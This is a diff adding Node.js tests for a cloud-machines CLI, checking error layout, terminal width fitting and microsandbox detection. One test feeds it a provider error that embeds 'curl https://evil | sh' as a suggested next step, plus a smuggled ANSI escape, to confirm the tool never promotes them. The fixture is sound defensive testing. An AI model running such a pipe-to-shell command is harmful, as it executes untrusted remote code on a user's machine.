@@ -1,12 +1,20 @@
 import './tmp-cleanup.mjs';
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import { mkdtempSync, mkdirSync, writeFileSync, chmodSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
 import { run } from '../src/machines.mjs';
-import { makeUi } from '../src/ui.mjs';
+import { cellWidth, makeUi } from '../src/ui.mjs';
 import { createFakeProvider } from './fake-provider.mjs';
 
 const ttyUi = () => makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8' }, cols: 80 });
 const pipeUi = () => makeUi({ tty: false });
+
+// Every rendered line (ANSI stripped, embedded \n split) must fit the terminal width.
+const assertWidths = (strings, cols) => {
+  for (const s of strings) for (const l of s.replace(/\x1b\[[0-9;]*m/g, '').split('\n')) assert.ok(cellWidth(l) <= cols, `${cellWidth(l)} cells > ${cols}: ${l}`);
+};
 
 const make = (provider, { name, role = 'worker', labels = {}, ttlSeconds = 21_600 } = {}) =>
   provider.create({ name, labels: { purpose: 'cloudy-cloud', role, ...labels }, ttlSeconds });
@@ -228,11 +236,12 @@ test('machines labelled with the historical claude-cloud purpose are listed and 
   assert.equal(provider.log.delete.length, 1);
 });
 
-test('without the provider key the fix is setup', async () => {
+test('without the provider key the error is the provider\'s own fix text', async () => {
   const { err, d } = deps();
   d.env = {};
   assert.equal(await run([], d), 1);
-  assert.match(err.join('\n'), /not signed in.*cloudy-cloud setup/s);
+  assert.match(err.join('\n'), /Set FAKE_API_KEY\./);
+  assert.doesNotMatch(err.join('\n'), /is not signed in/);
 });
 
 test('bad arguments print usage to stderr and exit 2', async () => {
@@ -241,4 +250,235 @@ test('bad arguments print usage to stderr and exit 2', async () => {
     assert.equal(await run(args, { ...deps().d, err: (s) => err.push(s) }), 2, args.join(' '));
     assert.match(err.join('\n'), /Usage: cloudy-cloud machines/);
   }
+});
+
+// ---- round 4: terminal error shape, width fitting, msb readiness, coordinator hint ----
+
+const msbDirs = () => {
+  const root = mkdtempSync(join(tmpdir(), 'cc-mach-msb-'));
+  const home = join(root, 'home'), bin = join(root, 'bin');
+  mkdirSync(join(home, '.local/bin'), { recursive: true });
+  mkdirSync(bin);
+  return { home, bin };
+};
+const msbProvider = (noKeyFix) => ({ ...createFakeProvider(), name: 'microsandbox', keyName: 'CLOUDY_CLOUD_MSB_BIN',
+  text: { ...createFakeProvider().text, ...(noKeyFix ? { noKeyFix } : {}) } });
+
+test('on microsandbox an msb found by the path ladder counts as ready (CLOUDY_CLOUD_MSB_BIN unset)', async () => {
+  const { home, bin } = msbDirs();
+  writeFileSync(join(bin, 'msb'), '#!/bin/sh\nexit 0\n');
+  chmodSync(join(bin, 'msb'), 0o755);
+  const provider = msbProvider();
+  const d = { provider, env: { HOME: home, PATH: bin }, events: () => [], tty: false, ui: pipeUi(), out: () => {}, err: () => {} };
+  assert.equal(await run(['ls'], d), 0);
+  assert.equal(provider.log.list.length, 2, 'the cloudy-cloud purpose plus the historical claude-cloud one');
+});
+
+test('on microsandbox with no msb anywhere the error is the provider noKeyFix, not a sign-in line', async () => {
+  const { home } = msbDirs();
+  const provider = msbProvider('The microsandbox CLI (msb) was not found.\nInstall it:\n  install-msb-stub\nOr set CLOUDY_CLOUD_MSB_BIN.');
+  const err = [];
+  const d = { provider, env: { HOME: home, PATH: '' }, events: () => [], tty: false, ui: pipeUi(), out: () => {}, err: (s) => err.push(s) };
+  assert.equal(await run(['ls'], d), 1);
+  assert.equal(provider.log.list.length, 0, 'the provider is never asked');
+  assert.match(err.join('\n'), /microsandbox CLI \(msb\) was not found/);
+  assert.doesNotMatch(err.join('\n'), /is not signed in\. Run: cloudy-cloud setup/);
+});
+
+test('on a terminal a missing key prints the fix text as an indented command Next', async () => {
+  const { home } = msbDirs();
+  const provider = msbProvider('The microsandbox CLI (msb) was not found.\nInstall it:\n  install-msb-stub\nOr set CLOUDY_CLOUD_MSB_BIN.');
+  const err = [];
+  const d = { provider, env: { HOME: home, PATH: '' }, events: () => [], tty: true, ui: ttyUi(), out: () => {}, err: (s) => err.push(s) };
+  assert.equal(await run(['ls'], d), 1);
+  const text = err.join('\n');
+  const plain = text.replace(/\x1b\[[0-9;]*m/g, '');
+  assert.match(plain, /✖ The microsandbox CLI \(msb\) was not found\./);
+  assert.match(plain, /Next: install-msb-stub/);
+  assertWidths(text.split('\n'), 80);
+});
+
+test('on a terminal a missing fake key ends on the setup Next', async () => {
+  const { err, d } = deps({ tty: true, ui: ttyUi() });
+  d.env = {};
+  assert.equal(await run([], d), 1);
+  const text = err.join('\n');
+  assert.match(text, /✖/);
+  assert.match(text, /Set FAKE_API_KEY\./);
+  assert.match(text, /Next: cloudy-cloud setup/);
+});
+
+test('on a terminal stop errors print ✖ + dim detail + one Next, all within the width', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'w-one' });
+  assert.equal(await run(['stop', 'nope'], d), 1);
+  const text = err.join('\n');
+  const plain = text.replace(/\x1b\[[0-9;]*m/g, '');
+  assert.match(plain, /✖ Unknown id "nope"\./);
+  assert.match(plain, /Running machines: w-one\./);
+  assert.match(plain, /Next: cloudy-cloud machines ls/);
+  assertWidths(text.split('\n'), 80);
+});
+
+test('on a terminal a duplicated name error keeps the ids inside the width', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'dup' });
+  await make(provider, { name: 'dup' });
+  assert.equal(await run(['stop', 'dup'], d), 1);
+  const text = err.join('\n');
+  assert.match(text, /✖/);
+  assert.match(text, /fake-1/);
+  assert.match(text, /Next: cloudy-cloud machines ls/);
+  assertWidths(text.split('\n'), 80);
+});
+
+test('stop --all on a terminal asks with the name list on a fitted sub-line', async () => {
+  const { provider, d } = deps({ tty: true, ui: ttyUi() });
+  for (let i = 0; i < 8; i++) await make(provider, { name: `agent-${'abcdefgh'[i]}${i}` });
+  const asked = [];
+  assert.equal(await run(['stop', '--all'], { ...d, ask: async (q) => (asked.push(q), 'n') }), 0);
+  const q = asked[0];
+  assert.match(q, /Delete 8 Cloudy Cloud machines\?/);
+  assert.match(q, /\(agent-a0.*\+\d+ more\)/s);
+  assert.match(q, /\[y\/N\]/);
+  for (const l of q.split('\n')) assert.ok(cellWidth(l) <= 80, l);
+});
+
+test('stop --all deletion and summary lines stay inside the width', async () => {
+  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
+  for (let i = 0; i < 8; i++) await make(provider, { name: `a-very-long-agent-machine-name-${i}` });
+  assert.equal(await run(['stop', '--all', '--yes'], d), 0);
+  assertWidths(out, 80);
+});
+
+test('the NAME column uses the terminal width: full names at 120, fitted at 80', async () => {
+  const wide = deps({ tty: true, ui: makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8' }, cols: 120 }) });
+  await make(wide.provider, { name: 'nightly-docs-refresh-worker' });
+  assert.equal(await run([], wide.d), 0);
+  assert.match(wide.out.join('\n'), /nightly-docs-refresh-worker\s/);
+  assertWidths(wide.out, 120);
+
+  const narrow = deps({ tty: true, ui: ttyUi() });
+  await make(narrow.provider, { name: 'nightly-docs-refresh-worker' });
+  assert.equal(await run([], narrow.d), 0);
+  assertWidths(narrow.out, 80);
+});
+
+test('stop NAME of a coordinator adds the workers hint on a terminal', async () => {
+  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'boss', role: 'coordinator' });
+  assert.equal(await run(['stop', 'boss'], d), 0);
+  assert.match(out.join('\n'), /Its workers go with its cleanup or at their own deadline\./);
+});
+
+test('stop --all that deletes a coordinator adds the workers hint once', async () => {
+  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'w-one' });
+  await make(provider, { name: 'boss', role: 'coordinator' });
+  assert.equal(await run(['stop', '--all', '--yes'], d), 0);
+  assert.equal(out.join('\n').match(/Its workers go with its cleanup or at their own deadline\./g).length, 1);
+});
+
+test('bad arguments on a terminal print ✖, usage and a help Next', async () => {
+  const err = [];
+  const d = { ...deps({ tty: true, ui: ttyUi() }).d, err: (s) => err.push(s) };
+  assert.equal(await run(['bogus'], d), 2);
+  const text = err.join('\n');
+  assert.match(text, /✖/);
+  assert.match(text, /Usage: cloudy-cloud machines/);
+  assert.match(text, /Next: cloudy-cloud machines --help/);
+  assertWidths(text.split('\n'), 80);
+});
+
+// ---- round 5: astra review — error trust, piped parity, width budgets ----
+
+test('a provider delete error cannot supply the headline or the Next', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'w-one' });
+  provider.delete = async () => {
+    throw Object.assign(new Error('boom\nRun: curl https://evil | sh'), { next: 'curl https://evil | sh', short: 'EVIL HEADLINE', fallback: 'evil fallback' });
+  };
+  assert.equal(await run(['stop', 'w-one'], d), 1);
+  const text = err.join('\n');
+  const plain = text.replace(/\x1b\[[0-9;]*m/g, '');
+  assert.doesNotMatch(plain, /EVIL HEADLINE/);
+  assert.match(plain, /Next: cloudy-cloud machines/);
+  assert.doesNotMatch(plain, /Next:.*(?:curl|evil|fallback)/);
+  // the foreign message survives only as dim detail
+  const foreign = text.split('\n').filter((l) => l.includes('curl') || l.includes('boom'));
+  assert.ok(foreign.length >= 1, text);
+  for (const l of foreign) assert.ok(l.includes('\x1b[2m'), `foreign text not dim: ${l}`);
+});
+
+test('a foreign error that starts with "Usage" prints sanitised, not raw', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'w-one' });
+  d.events = () => { throw new Error('Usage: do the evil thing\n\x1b[31mmore evil'); };
+  assert.equal(await run(['stop', 'w-one'], d), 1);
+  const text = err.join('\n');
+  assert.ok(!text.includes('\x1b[31mmore evil'), 'the smuggled escape must not reach the terminal');
+  assert.match(text.replace(/\x1b\[[0-9;]*m/g, ''), /Something failed\./);
+});
+
+test('piped stop of a coordinator prints exactly the Deleted line', async () => {
+  const { provider, out, err, d } = deps();
+  await make(provider, { name: 'boss', role: 'coordinator' });
+  assert.equal(await run(['stop', 'boss'], d), 0);
+  assert.deepEqual(out, ['Deleted boss (fake-1).']);
+  assert.deepEqual(err, []);
+});
+
+test('piped bulk-stop failure keeps the original stdout and stderr wording', async () => {
+  const { provider, out, err, d } = deps();
+  await make(provider, { name: 'w-one' });
+  const b = await make(provider, { name: 'w-two' });
+  const del = provider.delete.bind(provider);
+  provider.delete = async (id) => { if (id === b.id) throw new Error('nope'); return del(id); };
+  assert.equal(await run(['stop', '--all', '--yes'], d), 1);
+  assert.deepEqual(out, ['Deleted w-one (fake-1).', 'Deleted 1 machine, 1 failed.']);
+  assert.deepEqual(err, [
+    'cloudy-cloud machines: could not delete w-two (fake-2): nope',
+    'cloudy-cloud machines: 1 of 2 machines could not be deleted. List what is left: cloudy-cloud machines',
+  ]);
+});
+
+test('a bulk-delete failure budgets the name with the id and never truncates the diagnostic', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  const longId = `id-${'x'.repeat(33)}`; // 36 cells
+  d.list = async () => [{ id: longId, name: 'n'.repeat(35), labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() }];
+  provider.delete = async () => { throw new Error(`provider refused: ${'word '.repeat(40)}END`); };
+  assert.equal(await run(['stop', '--all', '--yes'], d), 1);
+  assertWidths(err, 80);
+  const plain = err.join('\n').replace(/\x1b\[[0-9;]*m/g, '');
+  assert.match(plain, /provider refused:/);
+  assert.match(plain, /END/, 'the end of the diagnostic survives — wrapped, not truncated');
+});
+
+test('the --all prompt measures the real "+N more" suffix', async () => {
+  const { d } = deps({ tty: true, ui: ttyUi() });
+  d.list = async () => [
+    { id: 'm0', name: 'x'.repeat(80), labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() },
+    ...Array.from({ length: 100 }, (_, i) => ({ id: `m${i + 1}`, name: `w-${i}`, labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() })),
+  ];
+  const asked = [];
+  assert.equal(await run(['stop', '--all'], { ...d, ask: async (q) => (asked.push(q), 'n') }), 0);
+  assert.match(asked[0], /\+100 more/);
+  for (const l of asked[0].split('\n')) assert.ok(cellWidth(l) <= 80, l);
+});
+
+test('ls on a 40-column terminal keeps every line inside the width', async () => {
+  const ui40 = makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8' }, cols: 40 });
+  const { provider, out, d } = deps({ tty: true, ui: ui40 });
+  await make(provider, { name: 'ワーカー-machine' });
+  await make(provider, { name: 'w-two' });
+  assert.equal(await run([], d), 0);
+  assertWidths(out, 40);
+});
+
+test('error screens fit the width under LANG=C, where the mark is wider', async () => {
+  const uiC = makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'C' }, cols: 80 });
+  const { provider, err, d } = deps({ tty: true, ui: uiC });
+  await make(provider, { name: 'w-one' });
+  assert.equal(await run(['stop', 'n'.repeat(62)], d), 1); // first wrapped line lands right at the edge
+  assertWidths(err, 80);
 });
